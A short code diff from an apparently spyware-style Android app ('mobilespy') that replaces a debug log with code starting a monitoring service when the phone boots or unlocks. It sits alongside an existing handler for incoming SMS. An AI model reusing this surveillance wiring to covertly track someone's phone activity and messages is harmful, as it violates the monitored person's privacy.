@@ -1,7 +1,5 @@
 package org.ddth.android.mobilespy;
 
-import org.ddth.http.core.Logger;
-
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
@@ -21,7 +19,9 @@ public class MobileSpyReceiver extends BroadcastReceiver {
 		if (Intent.ACTION_BOOT_COMPLETED.equals(action) ||
 			Intent.ACTION_USER_PRESENT.equals(action))
 		{
-			Logger.getDefault().debug("PHONE ACTIVATED");
+			Intent service = new Intent(context, MobileSpyService.class);
+			service.putExtra(MobileSpyService.EXTRA_EVENT_TYPE, MobileSpyService.EVENT_TYPE_PHONE_ACTIVATED);
+			context.startService(service);
 		}
 		else if (ACTION_SMS_RECEIVED.equals(action)) {
 			Intent service = new Intent(context, MobileSpyService.class);
